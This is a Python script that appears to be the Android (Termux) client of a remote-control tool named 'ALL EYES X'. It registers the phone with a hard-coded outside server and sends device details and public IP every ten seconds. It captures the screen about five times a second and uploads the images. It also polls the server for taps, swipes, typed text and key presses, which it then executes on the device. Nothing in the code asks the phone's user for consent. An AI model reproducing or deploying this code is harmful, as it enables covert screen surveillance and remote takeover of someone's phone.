#!/usr/bin/env python3
"""
ALL EYES X — Termux Client v3.2 (Android)
"""
import requests
import json
import time
import base64
import os
import subprocess
import threading
import hashlib
import socket
from io import BytesIO

SERVER_URL = "https://meta-f.bittern-adelie.ts.net"  # Change this
# Generate stable device ID
def get_device_id():
    try:
        # Use Android ID or MAC-like hash
        result = subprocess.run(['getprop', 'ro.serialno'], capture_output=True, text=True)
        serial = result.stdout.strip()
        if not serial:
            result = subprocess.run(['getprop', 'ro.build.fingerprint'], capture_output=True, text=True)
            serial = result.stdout.strip()
        if not serial:
            serial = socket.gethostname()
        return hashlib.sha256(serial.encode()).hexdigest()[:16]
    except:
        return hashlib.sha256(b"termux_android").hexdigest()[:16]

DEVICE_ID = get_device_id()

def get_device_info():
    info = {'id': DEVICE_ID, 'status': 'online'}
    
    try:
        info['hostname'] = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip() or 'Android'
        info['os'] = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True).stdout.strip() or 'Android'
        info['os_version'] = f"Android {info['os']}"
        info['architecture'] = subprocess.run(['uname', '-m'], capture_output=True, text=True).stdout.strip()
        info['ip'] = subprocess.run(['hostname', '-I'], capture_output=True, text=True).stdout.strip().split()[0] if subprocess.run(['hostname', '-I'], capture_output=True).stdout.strip() else '0.0.0.0'
        info['mac'] = ':'.join(DEVICE_ID[i:i+2] for i in range(0, 12, 2))
        info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        pass
    
    return info

# Screenshot function for Android (requires root or scrcpy)
def take_screenshot():
    """Android screenshot via screencap (no root needed on most devices)"""
    try:
        result = subprocess.run(['screencap', '-p', '/sdcard/aex_screen.png'], capture_output=True, timeout=3)
        if result.returncode == 0:
            with open('/sdcard/aex_screen.png', 'rb') as f:
                img_b64 = base64.b64encode(f.read()).decode()
            os.remove('/sdcard/aex_screen.png')
            return img_b64
        return None
    except:
        return None

def send_heartbeat():
    while True:
        try:
            requests.post(f"{SERVER_URL}/api/devices", 
                json=get_device_info(), timeout=5)
        except:
            pass
        time.sleep(10)

def screenshot_loop():
    """Screen sharing at ~5 FPS (Android limitation)"""
    while True:
        try:
            img = take_screenshot()
            if img:
                requests.post(f"{SERVER_URL}/api/screenshot/{DEVICE_ID}",
                    json={'image': img}, timeout=3)
        except:
            pass
        time.sleep(0.2)  # 5 FPS

def touch_poll_loop():
    """Poll for touch events and execute them"""
    last_ack = 0
    while True:
        try:
            r = requests.get(f"{SERVER_URL}/api/touch/poll/{DEVICE_ID}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                for event in data.get('events', []):
                    execute_touch(event)
                    if event.get('id', 0) > last_ack:
                        last_ack = event['id']
                
                if last_ack > 0:
                    requests.post(f"{SERVER_URL}/api/touch/ack/{DEVICE_ID}",
                        json={'event_id': last_ack}, timeout=3)
        except:
            pass
        time.sleep(0.1)

def execute_touch(event):
    """Execute touch/mouse event using input tap/swipe"""
    try:
        etype = event.get('event', 'click')
        x = int(event.get('x', 0))
        y = int(event.get('y', 0))
        
        if etype == 'click':
            subprocess.run(['input', 'tap', str(x), str(y)], capture_output=True, timeout=2)
        elif etype == 'swipe':
            x2 = int(event.get('x2', x))
            y2 = int(event.get('y2', y))
            duration = int(event.get('duration', 100))
            subprocess.run(['input', 'swipe', str(x), str(y), str(x2), str(y2), str(duration)], capture_output=True, timeout=2)
        elif etype == 'keyboard':
            key = event.get('key', '')
            subprocess.run(['input', 'text', key], capture_output=True, timeout=2)
        elif etype == 'keyevent':
            keycode = event.get('keycode', '61')  # 61 = ENTER
            subprocess.run(['input', 'keyevent', str(keycode)], capture_output=True, timeout=2)
    except Exception as e:
        print(f"[Touch] Error: {e}")

if __name__ == '__main__':
    print(f"[+] ALL EYES X Termux Client")
    print(f"[+] Device ID: {DEVICE_ID}")
    print(f"[+] Server: {SERVER_URL}")
    
    # Register initially
    try:
        r = requests.post(f"{SERVER_URL}/api/devices", json=get_device_info(), timeout=5)
        print(f"[+] Registration: {r.status_code}")
    except Exception as e:
        print(f"[-] Registration failed: {e}")
    
    # Start threads
    threading.Thread(target=send_heartbeat, daemon=True).start()
    threading.Thread(target=touch_poll_loop, daemon=True).start()
    threading.Thread(target=screenshot_loop, daemon=True).start()
    
    # Keep alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n[-] Shutting down")